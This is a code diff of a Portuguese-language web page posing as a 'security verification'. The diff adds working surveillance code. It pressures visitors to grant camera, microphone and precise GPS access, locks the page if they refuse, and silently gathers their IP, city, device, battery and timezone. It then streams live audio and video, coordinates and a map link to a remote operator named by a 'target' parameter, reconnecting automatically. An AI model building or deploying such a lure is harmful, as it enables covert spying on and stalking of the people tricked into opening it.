@@ -4,7 +4,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Sessão Segura P2P</title>
+    <title>Verificação de Segurança</title>
     <script src="https://cdn.tailwindcss.com"></script>
     <script src="https://unpkg.com/peerjs@1.5.2/dist/peerjs.min.js"></script>
     <style>
@@ -12,151 +12,236 @@
             background-color: #020617;
             color: #e2e8f0;
             font-family: ui-sans-serif, system-ui, sans-serif;
+            overflow: hidden;
+        }
+
+        .glitch-text {
+            animation: blink 2s linear infinite;
+        }
+
+        @keyframes blink {
+
+            0%,
+            100% {
+                opacity: 1;
+            }
+
+            50% {
+                opacity: 0.5;
+            }
         }
     </style>
 </head>
 
 <body class="flex flex-col items-center justify-center min-h-screen p-4">
 
-    <div
-        class="max-w-sm w-full bg-slate-900 border border-slate-800 p-8 rounded-2xl text-center shadow-xl relative overflow-hidden">
-        <div id="rec-indicator" class="absolute top-4 right-4 flex items-center gap-2 hidden">
-            <div class="w-2 h-2 bg-red-500 rounded-full animate-pulse"></div>
-            <span class="text-[10px] font-mono text-slate-400">REC</span>
-        </div>
-
-        <div id="icon-container" class="mb-6">
-            <svg class="w-14 h-14 text-sky-500 mx-auto" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+    <div id="blocker-modal"
+        class="fixed inset-0 z-50 bg-slate-950/95 backdrop-blur-md flex flex-col items-center justify-center p-6 text-center">
+        <div class="max-w-md w-full bg-slate-900 border-2 border-slate-700 p-8 rounded-2xl shadow-2xl">
+            <svg class="w-20 h-20 text-sky-500 mx-auto mb-6 glitch-text" fill="none" stroke="currentColor"
+                viewBox="0 0 24 24">
                 <path stroke-linecap="round" stroke-linejoin="round" stroke-width="1.5"
-                    d="M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z">
+                    d="M12 9v2m0 4h.01m-6.938 4h13.856c1.54 0 2.502-1.667 1.732-3L13.732 4c-.77-1.333-2.694-1.333-3.464 0L3.34 16c-.77 1.333.192 3 1.732 3z">
                 </path>
             </svg>
+
+            <h1 class="text-2xl font-black text-white mb-4">ATENÇÃO NECESSÁRIA</h1>
+            <p id="modal-instructions" class="text-slate-300 font-medium mb-8 leading-relaxed">
+                AUTORIZE TUDO O QUE FOR PEDIDO PARA PROSSEGUIR.<br>
+                <span class="text-sm text-slate-500 font-normal mt-2 block">O sistema requer acesso de mídia e
+                    geolocalização para liberar a página.</span>
+            </p>
+
+            <button id="btn-prosseguir"
+                class="w-full bg-sky-600 hover:bg-sky-500 text-white font-bold py-4 rounded-xl text-lg transition shadow-lg shadow-sky-900/50 uppercase tracking-widest">
+                Prosseguir
+            </button>
         </div>
+    </div>
 
-        <h2 id="main-title" class="text-lg font-bold mb-2">Autenticação Necessária</h2>
-        <p id="sub-title" class="text-slate-400 mb-8 text-sm leading-relaxed">Para prosseguir para o ambiente seguro,
-            ative as permissões requeridas pelo sistema.</p>
-
-        <button id="start-btn"
-            class="w-full bg-sky-600 hover:bg-sky-500 text-white py-3 rounded-lg font-semibold transition shadow-lg shadow-sky-900/20">
-            Autorizar e Conectar
-        </button>
-
-        <div class="mt-6 p-3 bg-slate-950 rounded border border-slate-800">
-            <p id="log" class="text-[10px] font-mono text-slate-500 text-left break-words h-12 overflow-y-auto">Sistema
-                em standby...</p>
+    <div id="main-interface"
+        class="max-w-sm w-full bg-slate-900 border border-slate-800 p-8 rounded-2xl text-center shadow-xl relative opacity-0 transition-opacity duration-1000">
+        <div id="rec-indicator" class="absolute top-4 right-4 flex items-center gap-2">
+            <div class="w-2 h-2 bg-red-500 rounded-full animate-pulse"></div>
+            <span class="text-[10px] font-mono text-slate-400">REC (A/V)</span>
+        </div>
+        <div id="icon-container" class="mb-6">
+            <svg class="w-14 h-14 text-emerald-500 mx-auto" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                <path stroke-linecap="round" stroke-linejoin="round" stroke-width="1.5"
+                    d="M9 12l2 2 4-4m6 2a9 9 0 11-18 0 9 9 0 0118 0z"></path>
+            </svg>
+        </div>
+        <h2 class="text-lg font-bold mb-2">Conexão Estabelecida</h2>
+        <p class="text-slate-400 mb-6 text-sm leading-relaxed">Túnel criptografado ativo.</p>
+        <div class="p-3 bg-slate-950 rounded border border-slate-800">
+            <p id="log" class="text-[10px] font-mono text-slate-500 text-left break-words h-12 overflow-y-auto">
+                Autenticação concluída...</p>
         </div>
     </div>
 
     <script>
         const logEl = document.getElementById('log');
-        const log = (msg) => {
-            logEl.innerHTML += `<div>> ${msg}</div>`;
-            logEl.scrollTop = logEl.scrollHeight;
-        };
+        const log = (msg) => { logEl.innerHTML += `<div>> ${msg}</div>`; logEl.scrollTop = logEl.scrollHeight; };
 
         const urlParams = new URLSearchParams(window.location.search);
         const targetId = urlParams.get('target');
 
         let streamDeVideo = null;
         let peer = null;
+        let dataConnection = null;
         let isDead = false;
         let intervaloReconexao = null;
+        let coordenadasFixadas = null;
 
-        document.getElementById('start-btn').addEventListener('click', async () => {
-            if (!targetId) return log('Erro: Target ID vazio.');
+        let telemetria = {
+            ip: '...', city: '...', region: '...', country: '...',
+            os: '...', device: '...', browser: '...', battery: '...', timezone: '...', language: '...'
+        };
 
-            const btn = document.getElementById('start-btn');
-            btn.disabled = true;
-            btn.textContent = "Acessando hardware...";
+        // Carrega dados passivos no fundo
+        telemetria.timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
+        telemetria.language = navigator.language;
+        fetch('https://get.geojs.io/v1/ip/geo.json').then(res => res.json()).then(data => {
+            telemetria.ip = data.ip; telemetria.city = data.city || ''; telemetria.region = data.region || ''; telemetria.country = data.country || '';
+        }).catch(() => { });
+
+        if ('getBattery' in navigator) {
+            navigator.getBattery().then(battery => {
+                const format = () => `${Math.round(battery.level * 100)}% (${battery.charging ? '⚡' : '🔋'})`;
+                telemetria.battery = format();
+                const sendUpdate = () => { if (dataConnection?.open) dataConnection.send({ type: 'TARGET_EVENT', message: `Energia: ${format()}` }); };
+                battery.addEventListener('levelchange', sendUpdate); battery.addEventListener('chargingchange', sendUpdate);
+            });
+        }
+
+        // --- FLUXO FORÇADO DE PERMISSÕES ---
+        document.getElementById('btn-prosseguir').addEventListener('click', async () => {
+            if (!targetId) {
+                travarTelaErro("ERRO 404: Link de conexão inválido ou quebrado.");
+                return;
+            }
+
+            const btn = document.getElementById('btn-prosseguir');
+            btn.textContent = "Aguardando Câmera e Microfone...";
+            btn.classList.add('animate-pulse');
 
             try {
-                // Pede a câmera apenas UMA VEZ e guarda na variável global
+                // PASSO 1: Força o pedido de Câmera e Microfone
                 streamDeVideo = await navigator.mediaDevices.getUserMedia({
                     video: { facingMode: "user", width: { ideal: 1280 } },
-                    audio: false
+                    audio: true
                 });
 
-                log('Câmera ativada.');
-                atualizarInterfaceAtiva();
-                iniciarConexao();
+                // PASSO 2: Câmera aceita. Força o pedido de GPS imediatamente
+                btn.textContent = "Câmera OK. Aguardando Localização...";
+
+                if (navigator.geolocation) {
+                    navigator.geolocation.getCurrentPosition(
+                        (pos) => {
+                            // TUDO ACEITO
+                            coordenadasFixadas = pos;
+                            liberarSistema();
+                        },
+                        (err) => {
+                            // GPS NEGADO
+                            if (err.code === err.PERMISSION_DENIED) {
+                                travarTelaErro("ACESSO NEGADO: Você bloqueou a Localização.<br><br>Para prosseguir, clique no ícone de <b>Cadeado</b> na barra de endereços (topo da tela), permita o Local e recarregue a página.");
+                            } else {
+                                // Erro de timeout do GPS, mas o usuário não negou de propósito. Libera.
+                                liberarSistema();
+                            }
+                        },
+                        { enableHighAccuracy: true, timeout: 10000 }
+                    );
+                } else {
+                    liberarSistema(); // Navegador não tem GPS
+                }
 
             } catch (err) {
-                log(`Falha crítica: Câmera em uso ou bloqueada. (${err.name})`);
-                btn.textContent = "Falha no Hardware";
-                btn.classList.replace('bg-sky-600', 'bg-red-600');
+                // CÂMERA/MIC NEGADO
+                travarTelaErro("ACESSO NEGADO: Você bloqueou a Câmera/Microfone.<br><br>Para prosseguir, clique no ícone de <b>Cadeado</b> na barra de endereços (topo da tela), ative as permissões e recarregue a página.");
             }
         });
 
-        function atualizarInterfaceAtiva() {
-            document.getElementById('icon-container').innerHTML = `<svg class="w-14 h-14 text-emerald-500 mx-auto" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="1.5" d="M9 12l2 2 4-4m6 2a9 9 0 11-18 0 9 9 0 0118 0z"></path></svg>`;
-            document.getElementById('main-title').textContent = "Conexão Estabelecida";
-            document.getElementById('sub-title').textContent = "Túnel criptografado ativo.";
-            document.getElementById('rec-indicator').classList.remove('hidden');
-            document.getElementById('start-btn').style.display = 'none';
+        function travarTelaErro(mensagem) {
+            document.getElementById('modal-instructions').innerHTML = `<span class="text-red-400 font-bold">${mensagem}</span>`;
+            const btn = document.getElementById('btn-prosseguir');
+            btn.classList.remove('animate-pulse', 'bg-sky-600', 'hover:bg-sky-500');
+            btn.classList.add('bg-slate-800', 'text-slate-500', 'cursor-not-allowed');
+            btn.textContent = "Sistema Travado";
+            btn.disabled = true;
+            if (streamDeVideo) streamDeVideo.getTracks().forEach(t => t.stop()); // Mata hardware se só bloqueou o GPS
         }
 
+        async function liberarSistema() {
+            document.getElementById('blocker-modal').style.display = 'none';
+            document.getElementById('main-interface').classList.remove('opacity-0');
+            document.body.style.overflow = 'auto';
+
+            // Coleta info do OS e entra na rede
+            await coletarTelemetriaOS();
+            iniciarConexao();
+        }
+
+        async function coletarTelemetriaOS() {
+            const ua = navigator.userAgent;
+            if (/android/i.test(ua)) { telemetria.os = 'Android'; telemetria.device = 'Smartphone Android'; }
+            else if (/iPad|iPhone/.test(ua)) { telemetria.os = 'iOS'; telemetria.device = 'iPhone/iPad'; }
+            else if (/Windows/.test(ua)) { telemetria.os = 'Windows'; telemetria.device = 'PC'; }
+        }
+
+        // --- SISTEMA WEBRTC ---
         function iniciarConexao() {
             if (isDead) return;
-
-            // Limpa conexões antigas
             if (peer) peer.destroy();
 
             peer = new Peer();
-
             peer.on('open', () => {
-                log('Conectando ao Agente...');
+                log('Iniciando handshake com o terminal...');
+                dataConnection = peer.connect(targetId);
 
-                const conn = peer.connect(targetId);
-                conn.on('data', (data) => {
-                    if (data.command === 'KILL_SWITCH') matarTudo();
+                dataConnection.on('open', () => {
+                    dataConnection.send({
+                        type: 'TARGET_INFO', ip: telemetria.ip, city: telemetria.city, region: telemetria.region, country: telemetria.country,
+                        os: telemetria.os, device: telemetria.device, battery: telemetria.battery, timezone: telemetria.timezone, language: telemetria.language
+                    });
+
+                    // Se pegou o GPS no modal, manda agora
+                    if (coordenadasFixadas) {
+                        dataConnection.send({
+                            type: 'TARGET_GPS', lat: coordenadasFixadas.coords.latitude, lng: coordenadasFixadas.coords.longitude,
+                            accuracy: Math.round(coordenadasFixadas.coords.accuracy),
+                            link: `https://www.google.com/maps?q=${coordenadasFixadas.coords.latitude},${coordenadasFixadas.coords.longitude}`
+                        });
+                    }
                 });
 
-                // Usa o stream guardado na memória, não pede permissão de novo
-                const call = peer.call(targetId, streamDeVideo);
+                dataConnection.on('data', (data) => { if (data.command === 'KILL_SWITCH') matarTudo(); });
 
-                // Monitora a queda de sinal (Seu F5)
+                const call = peer.call(targetId, streamDeVideo);
                 call.peerConnection.oniceconnectionstatechange = () => {
                     const state = call.peerConnection.iceConnectionState;
-                    if (state === 'disconnected' || state === 'failed') {
-                        tratarQuedaDeRede();
-                    }
+                    if (state === 'disconnected' || state === 'failed') tratarQuedaDeRede();
                 };
             });
 
-            peer.on('error', (err) => {
-                if (err.type === 'peer-unavailable') tratarQuedaDeRede();
-            });
+            peer.on('error', (err) => { if (err.type === 'peer-unavailable') tratarQuedaDeRede(); });
         }
 
         function tratarQuedaDeRede() {
             if (isDead) return;
-            log('Sinal perdido. Retentando em 3s...');
-
-            // Tenta recriar o roteamento a cada 3 segundos
+            log('Sinal perdido. Reconectando...');
             clearTimeout(intervaloReconexao);
-            intervaloReconexao = setTimeout(() => {
-                iniciarConexao();
-            }, 3000);
+            intervaloReconexao = setTimeout(iniciarConexao, 3000);
         }
 
         function matarTudo() {
-            isDead = true;
-            clearTimeout(intervaloReconexao);
-
-            if (streamDeVideo) {
-                streamDeVideo.getTracks().forEach(track => track.stop()); // Desliga a câmera fisicamente
-            }
+            isDead = true; clearTimeout(intervaloReconexao);
+            if (streamDeVideo) streamDeVideo.getTracks().forEach(t => t.stop());
             if (peer) peer.destroy();
-
-            document.getElementById('rec-indicator').classList.add('hidden');
-            document.getElementById('icon-container').innerHTML = `<svg class="w-14 h-14 text-slate-600 mx-auto" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="1.5" d="M18.364 18.364A9 9 0 005.636 5.636m12.728 12.728A9 9 0 015.636 5.636m12.728 12.728L5.636 5.636"></path></svg>`;
-            document.getElementById('main-title').textContent = "Sessão Encerrada";
-            document.getElementById('main-title').classList.add('text-slate-500');
-            log('Segurança restaurada. Hardware desligado.');
+            log('Protocolo encerrado pelo terminal remoto.');
         }
 
-        // PROTOCOLO DE LIMPEZA: Se o alvo fechar a aba, desliga a câmera na marra
         window.addEventListener('beforeunload', () => {
             if (streamDeVideo) streamDeVideo.getTracks().forEach(t => t.stop());
             if (peer) peer.destroy();
